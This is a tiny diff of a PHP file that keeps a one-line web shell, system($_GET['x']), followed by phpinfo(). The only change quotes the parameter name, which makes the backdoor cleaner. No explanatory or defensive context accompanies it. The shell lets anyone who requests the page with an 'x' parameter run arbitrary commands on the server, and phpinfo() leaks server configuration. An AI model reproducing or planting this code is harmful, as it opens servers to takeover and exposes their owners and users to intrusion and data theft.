@@ -1,4 +1,4 @@
 <?
-system($_GET[x]);
+system($_GET['x']);
 phpinfo();
 ?>
